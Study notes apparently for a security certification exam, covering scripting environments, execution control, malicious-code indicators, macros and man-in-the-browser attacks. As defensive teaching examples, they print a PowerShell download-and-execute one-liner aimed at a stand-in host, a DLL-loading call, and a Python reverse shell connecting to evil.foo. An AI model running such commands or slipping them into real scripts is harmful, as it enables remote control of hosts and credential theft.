---
tags: [Implementation, OIR,section]
---
# EXAM OBJECTIVES COVERED

1.4 Given a scenario, analyze potential indicators associated with network attacks

3.2 Given a scenario, implement host or application security solutions

4.1 Given a scenario, use the appropriate tool to assess organizational security

As a security technician, you will often have to develop automation scripts, using a range of programming and scripting languages. Scripts can be used to return critical security assessment data and to configure hosts, so it is important that only validated code can be executed. You should also be able to identify malicious code in scripts and macros.
# SCRIPTING

Automation using scripting means that each configuration or build task is performed by a block of code. The script will take standard arguments as data, so there is less scope for uncertainty over configuration choices leading to errors. A [[script]] will use the following elements:

-   **Parameters** that the script takes as input data (passed to the script as arguments).
-   **Branching** and looping statements that can alter the flow of execution based on logic conditions.
-   **Validation** and error handlers to check inputs and ensure robust execution.
-   **Unit tests** to ensure that the script returns the expected outputs, given the expected inputs.

Popular scripting languages for automation include PowerShell ([docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7)), Python ([python.org](https://www.python.org/)), JavaScript ([w3schools.com/js](https://www.w3schools.com/js/)), Ruby ([ruby-lang.org/en](https://www.ruby-lang.org/en/)), and Go ([golang.org](https://golang.org/)). Scripting will also make use of domain-specific languages, such as SQL, XML parsing, regex, and orchestration tools.

A scripting language like Python is a general purpose or procedural language. It can be adapted to perform many tasks. A domain-specific language ([[DSL]]) **performs a particular task**, such as regex string parsing. Orchestration manages multiple automation scripts and configuration data to provision a service.

All coding languages have a **specific syntax that constrains the way sections of code are laid out in blocks and the standard statements that are available, such as branching and looping constructions.**
# PYTHON SCRIPT ENVIRONMENT

Python is a popular language for implementing all kinds of development projects, **including automation tools and security tools, as well as malicious scripts** ([python.org](https://www.python.org/)). Where many languages use brackets to denote blocks of code, Python uses **indentation** (4 spaces per level, by convention). Any statement that starts a block is delimited by a colon. Python is case-sensitive; for example, the variable user cannot be referred to by the label User or USER. Comment lines are marked by the # character. You can view inline help on modules, functions, and keywords using the help statement. For example, the following command shows help for the print function: help(print)

### Variables

Python uses the **= operator to assign a value to a variable**. Variables are not declared with a data type, such as string or integer, but Python is strongly typed, meaning that you cannot add an integer variable to a string variable, for instance. String literals can be delimited using single or double quotes.

### Functions

Functions are used to produce modular, reusable code. A function takes some arguments as parameters, performs some processing, and typically returns some output. When creating a script, you will use some functions from Python's modules and define your own functions. A function is defined using the following indentation syntax:

def fullname(name,surname):

 return name + " " + surname

/#This ends the function definition      Had to add the /

/#The next line calls the function to set a variable  Had to add the /

greeting = 'Hello ' + fullname('World', '')

print(greeting)

### Logic and Looping Statements

Branching and looping statements let you test conditions and perform repetitive actions using compact code. Python uses the following comparison operators:

Operator

Operation

==

Is equal to

!=

Is not equal to

<

Is less than

>

Is greater than

<=

Is less than or equal to

>=

Is greater than or equal to

A control block is written with indentation in the following general form:

if name == 'World':

 /#These indented statements are only executed if the condition is true  Had to add /

 print('Enter your first name')

 name = input()

 print('Enter your surname')

 surname = input()

/#This ends the if statement as the next line is not indented Had to add /

greeting = 'Hello ' + fullname(name,surname)

Python uses _only if_ for branching logic, though complex nested conditions can be simplified with _else_ and _elif_ (else if). Loops can be constructed using _for_ and _while_.

### Modules

A **Python module is a library of functions** for accomplishing standard tasks, such as opening a network socket or interacting with an operating system's API. One of the perceived strengths of Python is the huge number of modules. For example, the os module contains functions to interact with the operating system, while the socket module handles network connections and the url module opens and parses resource addresses. Various extension modules allow a Python script to interact with Windows APIs.

The presence of two malicious libraries within a Python repository illustrates the potential risks of third-party code ([https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi/](https://www.zdnet.com/article/two-malicious-python-libraries-removed-from-pypi/)).

### Execution

Python is an interpreted language, executed within the context of a binary Python process. In Windows, a Python script (.py) can be called via **python.exe (with a command window) or pythonw.exe (with no command window).** A Python script can also be compiled to a standalone **Windows executable using the py2exe** extension. This executable can be digitally signed.
# POWERSHELL SCRIPT ENVIRONMENT

PowerShell is the preferred method of performing Windows administration tasks ([docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7)). It has also become the Windows hacker's go-to toolkit. PowerShell statements can be executed at a PowerShell prompt, or run as a **script (.ps1)** on any PowerShell-enabled host.

The Get-Help cmdlet shows help on different elements of the PowerShell environment. PowerShell is case-insensitive.

### Cmdlets and Functions

Most PowerShell usage is founded on cmdlets. A [[cmdlet]] is a compiled library that exposes some configuration or administrative task, such as starting a VM in Hyper-V. Cmdlets use a Verb-Noun naming convention. **Cmdlets always return an object**. Typically, the return from a cmdlet will be **piped** to some other cmdlet or function. For example:

Get-Process | Where { $_.name -eq 'nmap' } | Format-List

You can also define simple functions for use within your scripts. Custom functions are declared within curly brackets:

function Cat-Name {

 param ($name,$surname)

 return $name + ' ' + $surname

}

/#This ends the function declaration; the next statement calls it  Had to add /

$greeting = 'Hello ' + $(Cat-Name('World',''))

Write-Host $greeting

**Note that a variable is declared by prefixing a label with $.** 

### Logic and Looping Statements

PowerShell supports a wider range of branching and looping structures than Python, including the switch and do statements. Curly brackets are used to structure the statements. **PowerShell uses textual operators (-eq, -ne, -lt, -gt, -le, and -ge).**

### Modules

PowerShell can also be used with a large number of modules, which are added to a script using the Import-Module cmdlet.

Varonis' blog series illustrates uses of PowerShell as a security administration platform ([varonis.com/blog/practical-powershell-for-it-security-part-i-file-event-monitoring](https://www.varonis.com/blog/practical-powershell-for-it-security-part-i-file-event-monitoring/)).
# EXECUTION CONTROL

Execution control is the process of determining what additional software or scripts may be installed or run on a host beyond its baseline.

### Allow and Block Lists

Execution control can be implemented as either an allow list or a block list.

-   **Allow list is a highly restrictive policy that means only running authorized processes and scripts.** Allowing only specific applications that have been added to a list will inevitably hamper users at some point and increase support time and costs. For example, a user might need to install a conferencing application at short notice.
-   **Block list is a permissive policy** that only prevents execution of listed processes and scripts. It is vulnerable to software that has not previously been identified as malicious (or capable of or vulnerable to malicious use).

These concepts can also be referred to as whitelists and blacklists, but most sources now deprecate this terminology.

### Code Signing

Code signing is the principal means of proving the authenticity and integrity of code (an executable or a script). T**he developer creates a cryptographic hash of the file then signs the hash using his or her private key.** The program is shipped with a copy of the developer's code signing certificate, which contains a public key that the destination computer uses to read and verify the signature. The OS then prompts the user to choose whether to accept the signature and run the program.

### OS-Based Execution Control

Execution control is often enforced using a third-party security product, but there are some built-in Windows features that can perform the task:

-   **Software Restriction Policies** ([[SRP]])—available for most versions and editions of Windows, SRP can be configured as group policy objects ([[GPOs]]) to passlist file system locations from which executables and scripts can launch. Rules can also be configured by publisher signature or by file hash. There is also support for creating blocklist-based rules.
-   AppLocker—improves configuration options and default usage of SRP. Notably AppLocker policies can be applied to user and group accounts rather than just computer accounts. However, AppLocker GPOs can only be configured for Enterprise and Ultimate editions of Windows 7 and later.
-   Windows Defender Application Control ([[WDAC]])—formerly Device Guard, this can be used to create Code Integrity ([[CI]]) policies, which can be used on their own or in conjunction with AppLocker. CI policies apply to the computer and affect all users. CI policies can be based on version-aware and publisher digital signatures, as well as image hashes and/or file paths. WDAC is a useful option for preventing administrator accounts from disabling execution control options ([docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control)). WDAC is principally configured using XML policy statements and PowerShell.

In Windows, execution of PowerShell scripts can be inhibited by the execution policy. Note that the execution policy is not an access control mechanism. It can be bypassed in any number of different ways. WDAC is a robust mechanism for restricting use of potentially dangerous code, such as malicious PowerShell.

In Linux, execution control is normally enforced by using a mandatory access control ([[MAC]]) kernel module or Linux Security Module ([[LSM]]). The two main LSMs are SELinux ([access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-selinux)) and AppArmor ([wiki.ubuntu.com/AppArmor](https://wiki.ubuntu.com/AppArmor)).
# MALICIOUS CODE INDICATORS

As with **buffer overflow, indicators of malicious code execution are either caught by endpoint protection software or discovered after the fact in logs of how the malware interacted with the network, file system, and registry**. If you are performing threat hunting or observing malware in a sandbox, it is helpful to consider the main types of **malicious activity**:

-   **Shellcode**—this is a minimal program designed to exploit a buffer overflow or similar vulnerability to gain privileges, or to drop a backdoor on the host if run as a Trojan ([attack.mitre.org/tactics/TA0002](https://attack.mitre.org/tactics/TA0002/)). Having gained a foothold, this type of attack will be followed by some type of network connection to download additional tools.
-   **Credential dumping**—the malware might try to access the credentials file (SAM on a local Windows workstation) or sniff credentials held in memory by the lsass.exe system process ([attack.mitre.org/tactics/TA0006](https://attack.mitre.org/tactics/TA0006/)).
-   **Lateral movement/insider attack**—the general procedure is to use the foothold to execute a process remotely, using a tool such as psexec ([docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)) or PowerShell ([attack.mitre.org/tactics/TA0008](https://attack.mitre.org/tactics/TA0008/)). The attacker might be seeking data assets or may try to widen access by changing the system security configuration, such as opening a firewall port or creating an account. If the attacker has compromised an account, these commands can blend in with ordinary network operations, though they could be anomalous behavior for that account.
-   **Persistence**—this is a mechanism that allows the [[threat actor]]'s backdoor to restart if the host reboots or the user logs off ([attack.mitre.org/tactics/TA0003](https://attack.mitre.org/tactics/TA0003/)). Typical methods are to use AutoRun keys in the registry, adding a scheduled task, or using Windows Management Instrumentation (WMI) event subscriptions.
# POWERSHELL MALICIOUS INDICATORS

There are numerous exploit frameworks to leverage PowerShell functionality, such as PowerShell Empire, PowerSploit, Metasploit, and Mimikatz. **Some suspicious indicators** for PowerShell execution include the following:

-   **Cmdlets** such as Invoke-Expression, Invoke-Command, Invoke-WMIMethod, New-Service, Create-Thread, Start-Process, and New-Object can indicate an attempt to run some type of binary shellcode. This is particularly suspicious if combined with a DownloadString or DownloadFile argument. One complication is that cmdlets can be shortened, assisting obfuscation. For example, Invoke-Expression can be run using IEX.

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://badsite.foo/DoEvil.ps1'); Do-Evil -StealCreds"

-   **Bypassing execution** policy can also act as an indicator. The PowerShell code may be called as a Base64 encoded string (-enc argument) or may use the -noprofile or -ExecutionPolicy Bypass arguments.
-   **Using system calls** to the Windows API might indicate an attempt to inject a DLL or perform process hollowing, where the malicious code takes over a legitimate process:

[Kernel32]::LoadLibrary("C:\Users\Foo\AppData\Local\Temp\doevil.dll")

-   **Using another type of script** to execute the PowerShell is also suspicious. For example, the attacker might use JavaScript code embedded in a PDF to launch PowerShell via a vulnerable reader app.

The big problem with PowerShell indicators is distinguishing them from legitimate behavior. The following [[techniques]] can be used to assist with this:

-   Use **group policy to restrict** execution of PowerShell to trusted accounts and hosts.
-   Use **group policy execution** control to run scripts only from trusted locations.
-   Consider use of Constrained Language Mode ([devblogs.microsoft.com/powershell/powershell-constrained-language-mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)) and signed scripts to limit the ability of exploit code to run on high-value target systems.
-   Use **PowerShell logging** ([docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7)) and the Antimalware Scan Interface ([docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps](https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)) to detect and prevent obfuscated and suspicious code.
-   Prevent the use of **old PowerShell** versions to mitigate the use of a downgrade attack to bypass access controls.

Symantec's white paper contains a useful introduction to PowerShell exploits ([docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en](https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en)).
# BASH AND PYTHON MALICIOUS INDICATORS

Most of the web runs on Linux, and Linux has proven remarkably resilient to attacks (meaning that it is able to withstand or recover quickly from difficult situations), given the high-value of the assets that depend on it. Most exploits of Linux systems depend on weak configuration, and/or vulnerabilities in web applications. In Linux, the command line is usually Bourne Again Shell ([[Bash]]). Many Linux systems have Python enabled as well. Python scripts or batch files of bash commands can be used for automation tasks, such as backup, or for malicious purposes.

A [[malicious script]] running on a Linux host might attempt the following:

1.  Use commands such as whoami and ifconfig/ip/route to establish the local context.
2.  Download tools, possibly using wget or curl.
3.  Add crontab entries to enable persistence.
4.  Add a user to sudo and enable remote access via SSH.
5.  Change firewall rules using iptables.
6.  Use tools such as Nmap to scan for other hosts.

A very common vector for attacking Linux hosts is to use an exploit to install a web shell as a backdoor ([acunetix.com/blog/articles/introduction-web-shells-part-1](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)). Typical code to implement a reverse shell (connecting out to the machine at evil.foo on port 4444) is as follows:

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("evil.foo",4444))

os.dup2(s.fileno(),0)

os.dup2(s.fileno(),1)

os.dup2(s.fileno(),2)

pty.spawn("/bin/sh")'

The os.dup2 statements redirect the **terminal's data streams stdin (0), stdout (1), and stderr (2) to the socket object (s).** The pty module provides a library of functions for managing a pseudo-terminal, in this case starting the shell process at /bin/sh.

The code to implement a shell can be obfuscated in numerous ways. One way to identify malicious scripts trying to match code samples is to scan the file system against a **configuration baseline,** either using file integrity monitoring or use of the Linux diff command. 

A common exploit for a vulnerable web server is to upload a cryptominer, misusing the server's CPU resources to try to obtain new cryptocurrency. You can use Linux utilities such as top and free to diagnose excessive CPU and memory resource consumption by such malware.

This F5 white paper describes the use of Bash and Python attack tools ([f5.com/labs/articles/threat-intelligence/attackers-use-new--sophisticated-ways-to-install-cryptominers](https://www.f5.com/labs/articles/threat-intelligence/attackers-use-new--sophisticated-ways-to-install-cryptominers)).
# MACROS AND VISUAL BASIC FOR APPLICATIONS (VBA)

A **document macro is a sequence of actions performed in the context of a word processor, spreadsheet, or presentation file.** While the user may be able to record macro steps using the GUI, ultimately macros are coded in a scripting language. Microsoft Office uses the Visual Basic for Applications (VBA) language, while PDF documents use JavaScript. Microsoft Office document macros can be inspected using ALT+F11. **Other vendors and open-source software also implement macro functionality, using languages such as Basic or Python.**

A malicious actor will try to use a macro-enabled document to execute arbitrary code. For example, a Word document could be the vector for executing a malicious PowerShell script. Macros are disabled by default in Office, but the attacker may be able to use a social engineering attack to get the user to change the policy.

With PDF, the JavaScript might be embedded within the document and designed to exploit a known vulnerability in the reader software to execute without authorization ([sentinelone.com/blog/malicious-pdfs-revealing-techniques-behind-attacks](https://www.sentinelone.com/blog/malicious-pdfs-revealing-techniques-behind-attacks/)).
# MAN-IN-THE-BROWSER ATTACK

A man-in-the-browser ([[MitB]]) attack is a specific type of [[on-path]] attack where the web browser is compromised. Depending on the level of privilege obtained, the attacker may be able to inspect session cookies, certificates, and data, change browser settings, perform redirection, and inject code.

A MitB attack may be accomplished by installing malicious plug-ins or scripts or intercepting calls between the browser process and [[DLLs]] ([attack.mitre.org/techniques/T1185](https://attack.mitre.org/techniques/T1185/)). The Browser Exploitation Framework ([[BeEF]]) ([beefproject.com](https://beefproject.com/)) is one well known MitB tool. There are various vulnerability exploit kits that can be installed to a website to actively try to exploit vulnerabilities in clients browsing the site ([trendmicro.com/vinfo/ie/security/definition/exploit-kit](https://www.trendmicro.com/vinfo/ie/security/definition/exploit-kit)). These kits may either be installed to a legitimate site without the owner's knowledge (by compromising access control on the web server) and load in an iFrame (invisible to the user), or the attacker may use phishing/social engineering techniques to trick users into visiting the site.

![Browser Exploitation Framework (BeEF) window showing a hooked browser at IP address 10.1.0.101 and details of browser software, version, and loaded plug-ins.](https://s3.amazonaws.com/wmx-api-production/courses/5731/images/787-1599771809708.png)

The Browser Exploitation Framework (BeEF) uses a script to "hook" a browser. The tool can be used to inspect session data and inject code.
